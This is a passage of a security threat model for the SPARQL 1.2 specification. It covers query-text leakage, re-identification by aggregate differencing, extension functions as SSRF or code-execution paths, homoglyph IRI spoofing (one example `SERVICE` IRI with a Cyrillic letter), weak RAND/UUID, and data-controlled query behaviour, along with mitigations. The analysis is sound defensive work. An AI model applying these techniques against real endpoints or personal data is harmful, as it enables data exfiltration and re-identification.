3. **Broken primitives presented without qualification.** MD5 and SHA-1 are not collision-resistant. The spec defines them neutrally — correctly, since they are also used for non-security checksums — but offers no caution, and deployments do reach for them.

---

#### SQ-CONF-07 — Query text is itself sensitive data

**Risk: Medium** (all profiles) · Impact Medium · Ease High (passive)

**Mechanism.** Queries carry the *selector*: the email, account number, patient id, or coordinates being looked up — typically as a literal in a `FILTER` or `VALUES`. The media type ([`#mediaType`](../../../spec/index.html#mediaType)) is a POST body, but query-in-URL via GET is common in practice.

**Impact.** Query text accumulates in server access logs, proxy logs, URLs, browser history, `Referer` headers, error messages, bug reports, and shared "try this query" links — none of which are usually classified at the sensitivity of the data they encode. Separately, `FROM` and `SERVICE` disclose to *third parties* which graphs a user is interested in, revealing the user's interest to a party that was never meant to learn it.

---

#### SQ-CONF-08 — Linkage, re-identification, and aggregate differencing

**Risk: Medium-High** (P2, P4, P5) · Impact High · Ease Medium

**Mechanism.** Joining across graphs is SPARQL's core competence, and with `SERVICE` it joins across *administrative domains* in one line. That is also the textbook re-identification mechanism: combining individually innocuous datasets to single out a person. Independently, aggregates ([`#aggregates`](../../../spec/index.html#aggregates)) permit **differencing** — compute `COUNT` with and without one condition and recover an individual fact — so "we only expose aggregates" is not anonymity.

**Impact.** Re-identification from permitted queries over permitted data, with no access-control violation anywhere. And federated evaluation moves personal data across jurisdictional boundaries as a *side effect of query evaluation*, which is a data-transfer compliance question, not only a security one.

---

### 3.E Extensibility

#### SQ-EXT-01 — Extension functions are arbitrary code in the evaluation path, named by the query

**Risk: High where extensions are enabled** · Impact Critical · Ease depends on registration

**Mechanism.** [`#extensionFunctions`](../../../spec/index.html#extensionFunctions): a `PrimaryExpression` may be "a call to an extension function named by an IRI", whose semantics "are identified by the IRI that identifies the function". [`#operatorExtensibility`](../../../spec/index.html#operatorExtensibility) permits added operator mappings. The only constraint the spec imposes is monotonicity: "No additional operator may yield a result that replaces any result other than an error", so that FILTER results remain a superset of the unextended ones. Nothing is said about side effects, resource consumption, filesystem access, or network access.

[`#extensionFunctions`](../../../spec/index.html#extensionFunctions) goes further and licenses behavioural divergence precisely where it is most security-relevant:

> "any function or operator that is specified to return an error under some conditions is a valid extension point. That is, an implementation may return a non-error value in these error cases, and still be conformant with this recommendation."

**Impact.** An extension function runs with the engine's privileges: it can read files (A6), make network requests with the engine's identity (A5, A4 — an SSRF and exfiltration path entirely outside `FROM`/`SERVICE` controls), consume unbounded resources, or crash the process. The escalation to **remote code execution** is an engine that resolves *unknown* function IRIs dynamically — plugin-lookup-by-IRI, classpath scanning, or, worst, dereferencing the function IRI to fetch code. Because the query names the function, dynamic resolution hands the attacker the choice of what runs. Separately, the error-case latitude means no security control can portably rely on "this expression errors" — which undercuts both SQ-CONF-03's reasoning and SQ-INJ-03's gatekeepers.

---

#### SQ-EXT-02 — Entailment regimes: unbounded cost, and inference around triple-level ACLs

**Risk: Medium** where entailment is enabled · Impact Medium-High · Ease Medium

**Mechanism.** [`#sparqlBGPExtend`](../../../spec/index.html#sparqlBGPExtend) permits BGP matching to be redefined by an entailment regime. Its obligations are weak by design: regimes "**should** provide conditions to prevent trivial infinite solution multisets as appropriate to the regime", and "The effect of a query on an inconsistent graph is not covered by this specification, but must be specified by the particular SPARQL extension."

**Impact.** (a) Reasoning cost ranges from expensive to undecidable, and the spec's safeguard is a `should` about *trivial* infinite results only — so an availability threat with no spec-level bound. (b) Inconsistent graphs have unspecified behaviour, which is an availability and correctness hazard an attacker can trigger by writing two conflicting triples (the spec's own example: `_:x rdf:type xsd:string` with `_:x rdf:type xsd:decimal`). (c) **For access control, the serious one:** entailment *derives* facts that were never stored as triples, so a per-triple permission model silently fails to cover inferred triples — data can be concluded that no permission check ever saw.

### 3.F Identity and naming confusion

#### SQ-ID-01 — IRI spoofing via confusables and bidirectional text

**Risk: Medium** · Impact Medium · Ease Medium

**Mechanism.** Already in [`#security`](../../../spec/index.html#security), which covers Cyrillic "о" versus Latin "o", combining sequences, and cites UTR36 and RFC 3987 §8. Its framing, though, is about *authors matching data*: "Users of SPARQL must take care to construct queries with IRIs that match the IRIs in the data."

**The security framing is different.** In a *query* language the risk is that a **human reviewer or an automated allowlist is deceived**. `SERVICE <https://trusted.exаmple/>` with a Cyrillic `а` passes visual review and reaches the attacker's host; a `FROM` allowlist checked by eye fails the same way. Additionally, bidirectional text — and now RDF 1.2 base direction, with `LANGDIR` and `STRLANGDIR` newly in this document — can make displayed query text differ in order from its logical content, a real hazard wherever queries are shown in a UI for approval.

---

#### SQ-ID-02 — No normalization: strict term identity, loose policy identity

**Risk: Medium** · Impact Medium · Ease Medium

**Mechanism.** [`#relIRIs`](../../../spec/index.html#relIRIs): "Neither Syntax-Based Normalization nor Scheme-Based Normalization ... are performed." [`#sec-escapes`](../../../spec/index.html#sec-escapes) adds that `%`-sequences "are not decoded during processing", with the worked example that `<http://a.example/%66oo-bar>` designates `http://a.example/%66oo-bar` and "not IRI `http://a.example/foo-bar`". [`#func-iri`](../../../spec/index.html#func-iri) says only that an implementation "MAY normalize the IRI."

This is correct for RDF semantics — term identity must be strict. The security consequence is the gap it opens between term identity and *network* identity: `<http://ex/a>`, `<http://EX/a>`, `<http://ex:80/a>`, and `<http://ex/%61>` are four distinct RDF terms and one network target.

**Impact.** Failures in both directions. A security control keyed on one spelling **fails open** against another. A data query using one spelling **fails closed** against data written with another — which is how an incomplete result gets mistaken for an authoritative "no".

---

#### SQ-ID-03 — Triple terms mention, they do not assert

**Risk: Medium** (new in 1.2) · Impact Medium · Ease Medium

**Mechanism.** A triple term is a *term*, not an assertion. `<<( :a :b :c )>>` occurring in data does not mean `:a :b :c` holds. The expansions in [`#syntaxReifyingTriples`](../../../spec/index.html#syntaxReifyingTriples) and [`#syntaxAnnotation`](../../../spec/index.html#syntaxAnnotation) differ on exactly this point: the annotation form expands to the asserted triple *plus* the reifying triple, whereas the bare `<<( ... )>>` nested pattern asserts nothing. And the reifier is attacker-suppliable — `<< ?s ?p ?o ~ ?id >>` matches any reifier, and in data an attacker who can write may choose the reifier IRI.

**Impact.** An application that treats a matched triple term as a fact — or a UI that renders one as a statement — can be fed unasserted or adversarial content. This matters most in exactly the applications reification exists for: provenance, attribution, trust, and audit. Treating the *existence* of a reifier as evidence of a claim's truth is the specific error, and the reifier's identity is not itself trustworthy evidence of origin.

---

### 3.G Integrity and non-determinism

#### SQ-INT-01 — Non-determinism breaks signing, caching, and audit replay

**Risk: Medium** · Impact Medium · Ease Low (mostly a correctness trap, exploitable in specific designs)

**Mechanism.** The specification leaves a long list of things unspecified or implementation-dependent, each deliberately:

| Construct | Spec text |
| --- | --- |
| [`#func-rand`](../../../spec/index.html#func-rand) | "pseudo-random"; "Numbers **should** be produced with approximately equal probability" — no unpredictability requirement |
| [`#func-now`](../../../spec/index.html#func-now) | same value throughout one execution, but "The exact moment returned is not specified" |
| [`#func-uuid`](../../../spec/index.html#func-uuid) | "The variant and version of the UUID is implementation dependent" |
| [`#aggSample`](../../../spec/index.html#aggSample) | "returns an arbitrary value from the sequence" |
| [`#aggGroupConcat`](../../../spec/index.html#aggGroupConcat) | "The order of the strings is not specified" |
| [`#modReduced`](../../../spec/index.html#modReduced) | duplicate elimination is permitted, not required |
| [`#construct`](../../../spec/index.html#construct) | "Implementations are allowed to produce duplicate triples or to deduplicate them" |
| [`#modOrderBy`](../../../spec/index.html#modOrderBy) | "SPARQL does not define a total ordering of all possible RDF terms. Implementations may define total ordering through operator extensibility" |
| [`#BlankNodesInResults`](../../../spec/index.html#BlankNodesInResults) | labels are per-result-set |
| [`#invocation`](../../../spec/index.html#invocation) | "The order of argument evaluation is not defined" |

**Impact on A8.** Any control that signs, hashes, caches, replays, or diffs results is unsound without care: identical queries legitimately yield different bytes, so signature verification and cross-engine comparison produce false mismatches, and audit replay cannot reproduce a recorded result. The sharpest instance is a **cache keyed on query text**: a query containing `NOW()` or `RAND()` has a correct result that changes between executions, so a cache that ignores this serves a stale result — and in a multi-tenant deployment, a cache key that omits the requester's identity *and* the effective dataset serves another tenant's result.

---

#### SQ-INT-02 — `RAND()` and `UUID()` are not security primitives, and data must not become control

**Risk: Medium-High** · Impact High · Ease Medium

**Two findings, both actionable.**

**(a) Unsuitable randomness.** [`#func-rand`](../../../spec/index.html#func-rand) requires only approximately uniform pseudo-randomness, with no unpredictability requirement — so `RAND()` must never seed a token, nonce, or secret. [`#func-uuid`](../../../spec/index.html#func-uuid) leaves "the variant and version ... implementation dependent", so a conforming `UUID()` may be version 1 — which embeds a MAC address and a timestamp, and is therefore both **predictable** and **host-identifying**. This matters because applications genuinely do use `UUID()` to mint identifiers in `CONSTRUCT` and `INSERT`, and if those identifiers are then treated as unguessable — capability URLs, share links, password-reset tokens — the result is a real vulnerability, and `STRUUID()` may additionally leak host and time information into published data.

**(b) Data must not become control.** If an attacker can write triples — via a separate ingest path, an update endpoint, or `FROM` dereference of an untrusted source (SQ-NET-05) — they influence more than results. Because the language permits variables in these positions, a value *from the data* can become:

- a `SERVICE` endpoint (`VarOrIri` — SQ-NET-03),
- a `GRAPH` target ([`#queryDataset`](../../../spec/index.html#queryDataset)),
- a `REGEX` pattern (SQ-DOS-05),
- an argument to `IRI()` and so a constructed dereference target.

This is the SPARQL analogue of stored-injection escalation: **write access to data becomes partial control over query behaviour.**

*Mitigation.* A value drawn from the dataset must never be used as an endpoint, a pattern, or a function name without validation against a static allowlist. In hardened profiles, reject variable `SERVICE` endpoints outright. Keep ingest provenance so data-sourced values can be identified as such.

| **T**ampering | SQ-NET-05, SQ-INT-02(b) | Query-side tampering is limited since query is read-only; the vector is poisoned data becoming control |

Two threats sit awkwardly in STRIDE and are worth noting as such: **SQ-NET-03's outbound exfiltration** is information disclosure in which the disclosure channel is the *service's own* egress rather than its response — so a control model built on "what do we return to the client" misses it entirely. **SQ-CONF-01** is not a threat in STRIDE terms at all but the absence of a mitigation, which is why it is listed first in its category: it is the premise the rest of §3.D depends on.
